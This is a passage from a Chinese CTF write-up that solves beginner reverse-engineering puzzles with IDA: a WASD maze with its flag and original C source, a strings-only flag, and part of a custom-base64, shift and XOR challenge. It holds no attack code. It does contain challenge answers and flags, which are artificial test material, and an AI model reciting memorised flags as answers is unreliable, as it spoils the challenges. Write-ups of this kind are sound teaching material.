<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116213310715.png" alt="image-20250116213310715"></p>
<p>​	没得到什么有用的信息，直接拖入附件到IDA中进行分析吧。</p>
<p>​	查看main函数，分析代码逻辑：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116215207142.png" alt="image-20250116215207142"></p>
<p>​	首先需要我们输入一个字符串，记作s，在接下来的while循环中遍历该字符串的每个字符。</p>
<p>​	其中87，83，65，68分别是W，S，A，D的ascii值，0则是<code>\0</code>的ascii值，如果s这个字符串中不是这几种字符，会触发”invaild character!”程序结束。</p>
<p>​	在接下来的while循环中还有三个判断：</p>
<ol>
<li><code>0xA</code>是16进制写法，A表示10进制的11，即该次if条件句判断<code>current_i</code>与<code>current_j</code>的值是否大于11，如果大于则输出”You’re out of bounds!”表示越界，程序中断；</li>
<li>在maze这个数组中，如果<code>maze_map[11 * current_i + current_j]==1</code>，则输出”You hit the wall!“表示撞墙了，程序中断；</li>
<li>如果<code>current_i==9</code>并且<code>current==10</code>则中断while循环，进行最后的判断：如果输入的字符串长度大于<code>0x16</code>（即10进制的22），则输出”Correct, but not the shortest!”表示答案正确，但不是最短，否则输出”you win!!!”表示成功。</li>
</ol>
<p>​	在整个过程中，有四个变量需要关注:</p>
<ul>
<li>maze_map：根据名字推测为迷宫地图</li>
<li>current_i与current_j：常与maze_map组合使用，且输入的字符串会影响其值的变化，推测为表示当前所处位置；</li>
<li>s：一个需要用户输入的字符串，仅能由WASD和<code>\0</code>组成，长度应该不超过22。</li>
</ul>
<p>​	查看maze_map：</p>
<p>​	shift+e提取值</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250116215638231.png" alt="image-20250116215638231"></p>
<p>​	其长度为121，仅由01组成，结合while循环中的第二个判断，推测1表示墙壁，0表示路，且应该是一个11*11的迷宫，将值提取处理一下得到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD maze_map[<span class="number">121</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​	很明显可以看由(1,0)和(9,10)两个与外界相通的点，(9,10)为终点，则很明显(1,0)为起点了。</p>
<p>​	如果maze_map确实为一个11*11的二维数组，那么<code>maze_map[11 * current_i + current_j]</code>等效于<code>maze_map[current_i][current_j]</code>。</p>
<p>​	如果输入W，则<code>current_i--</code>表示向上，输入S则<code>current_i++</code>表示向下，输入A则<code>current_j--</code>表示向左，输入D则<code>current_j++</code>表示向右。</p>
<p>​	此题迷宫较小可直接对着二维数组进行分析，走迷宫，可以得到路径为<code>DSSDDSSDDSSAASSDDDDDDD</code></p>
<p>​	当然也可以用脚本转成图像更直观体现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">array_to_image</span>(<span class="params">array, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="comment"># 计算图像的宽度和高度</span></span><br><span class="line">    width = <span class="built_in">len</span>(array[<span class="number">0</span>]) * block_size</span><br><span class="line">    height = <span class="built_in">len</span>(array) * block_size</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建一个新的白色图像</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历数组并绘制方块</span></span><br><span class="line">    <span class="keyword">for</span> y, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(array):</span><br><span class="line">        <span class="keyword">for</span> x, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">            color = <span class="string">&#x27;black&#x27;</span> <span class="keyword">if</span> val == <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;white&#x27;</span></span><br><span class="line">            left = x * block_size</span><br><span class="line">            top = y * block_size</span><br><span class="line">            right = left + block_size</span><br><span class="line">            bottom = top + block_size</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(left, right):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(top, bottom):</span><br><span class="line">                    img.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="keyword">if</span> color == <span class="string">&#x27;black&#x27;</span> <span class="keyword">else</span> (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二维数组</span></span><br><span class="line">array = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用函数将数组转换为图像</span></span><br><span class="line">image = array_to_image(array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示并保存图像</span></span><br><span class="line">image.show()</span><br><span class="line">image.save(<span class="string">&#x27;maze.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>​	得到的迷宫为：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/maze.png" alt="maze"></p>
<p>​	解为：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/maze-solved.png" alt="maze-solved"></p>
<p>​	flag为XAUTCTF{DSSDDSSDDSSAASSDDDDDDD}</p>
<p>​	附件原C语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> maze_map[<span class="number">11</span>][<span class="number">11</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, </span><br><span class="line">    &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, </span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, </span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, </span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, </span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;, </span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, </span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> current_i = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> current_j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> solve[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your solution:&gt;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, solve);</span><br><span class="line">    <span class="comment">// DSSDDSSDDSSAASSDDDDDDD</span></span><br><span class="line">    <span class="keyword">while</span> (solve[x] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(solve[x] == <span class="string">&#x27;W&#x27;</span>)&#123;</span><br><span class="line">            current_i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (solve[x] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">            current_i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (solve[x] == <span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">            current_j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (solve[x] == <span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">            current_j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;invalid character!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (current_i &lt; <span class="number">0</span> || current_i &gt; <span class="number">10</span> || current_j &lt; <span class="number">0</span> || current_j &gt; <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re out of bounds!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (maze_map[current_i][current_j] == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You hit the wall!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (current_i == <span class="number">9</span> &amp;&amp; current_j == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strlen</span>(solve) &lt;= <span class="number">22</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;you win!!!&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Correct, but not the shortest!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        x++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	可参考博客：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13303?time__1311=GqmxuD2DgDyiQGNDQieu0mK+8AD9ADWTpD#toc-0">ctf逆向-迷宫题型总结（思路巨清晰详细） - 先知社区</a>	</p>
<h3 id="Try-to-find-me"><a href="#Try-to-find-me" class="headerlink" title="Try to find me"></a>Try to find me</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br>​	<b style="color:cyan;">难度: </b>签到</br></p>
<p>​	想要flag？不给你，除非你能找到我！</p>
<p><strong>题解</strong></p>
<p>​	直接拖入IDA，按SHIFT+F12即可看见flag：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117182449591.png" alt="image-20250117182449591"></p>
<p>​	strings命令亦可：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117182520260.png" alt="image-20250117182520260"></p>
<h3 id="三相之力"><a href="#三相之力" class="headerlink" title="三相之力"></a>三相之力</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>BR</br><br><b style="color:cyan;">	难度: </b>简单</br></p>
<p>​	flag被分成了三份！！！该如何才能复原它？！</p>
<p><strong>题解</strong></p>
<p>​	拖入IDA分析代码逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-440h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-43Ch]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+8h] [rbp-438h]</span></span><br><span class="line">  _DWORD v8[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-430h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+30h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+438h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter &#x27;The Power of Misc&#x27;:&gt;&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%1023s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  s1 = (<span class="type">char</span> *)base64_encode(s, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;JwxIIwaBGXbC8z0e7FNN&quot;</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter &#x27;The Power of Crypto&#x27;:&gt;&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%1023s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; s[i]; s[i++] += <span class="number">7</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;fWOhaLf&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Right!!&quot;</span>);</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">56</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">110</span>;</span><br><span class="line">    v8[<span class="number">2</span>] = <span class="number">108</span>;</span><br><span class="line">    v8[<span class="number">3</span>] = <span class="number">29</span>;</span><br><span class="line">    v8[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">    v8[<span class="number">5</span>] = <span class="number">35</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter &#x27;The Power of Reverse&#x27;:&gt;&gt;&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%1023s&quot;</span>, s);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; s[j] &amp;&amp; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      s[j] ^= <span class="number">0x5Eu</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[j] != v8[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;failed...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">6</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You have successfully gathered the power of three phases!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;failed...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;failed...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	flag被分成了三段，首先第一部分”The Power of Misc”可以看出来是base64编码，但是解码出来是乱码：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117224615118.png" alt="image-20250117224615118"></p>
<p>​	说明应该是换表base64，找到表为<code>NOPQwxyz0RSTUaDEFGHABIJKL789+MijklmnoVWXYZpqbc2345defghCrstuv16/</code></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117224718790.png" alt="image-20250117224718790"></p>
<p>​	解出第一部分：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250117224749558.png" alt="image-20250117224749558"></p>
<p>​	第二部分”The Power of Crypto”则是将输入的字符的ascii码加7，移位后为<code>fWOhaLf</code></p>
<p>​	一个小脚本就可以转回去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;fWOhaLf&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">    c = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">7</span>)</span><br><span class="line">    <span class="built_in">print</span>(c, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># _PHaZE_</span></span><br></pre></td></tr></table></figure>

